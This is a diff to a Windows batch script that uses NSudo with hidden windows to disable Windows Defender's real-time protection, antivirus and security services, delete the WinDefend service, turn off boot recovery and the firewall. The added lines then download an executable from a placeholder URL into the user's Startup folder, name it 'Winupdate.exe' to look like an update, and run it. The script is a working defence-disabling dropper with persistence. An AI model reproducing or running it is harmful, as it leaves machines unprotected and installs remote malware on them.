@@ -51,7 +51,7 @@ rem disables Windows Defender Security Center
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
 
 rem 1 - Disable Real-time protection
-reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+NSudo -U:T -ShowWindowMode:Hide reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
@@ -93,7 +93,7 @@ NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\System\CurrentControlSet\Services\
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
 
-sc delete  windefend
+NSudo -U:T -ShowWindowMode:Hide sc delete  windefend
 
 NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No
 
@@ -122,3 +122,9 @@ powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"
 powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"
 
 powershell.exe -command "netsh advfirewall set allprofiles state off"
+
+cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+powershell -command "start-bitstransfer https://Link-to-exe-here .\Winupdate.exe"
+
+powershell -command "start Winupdate.exe"
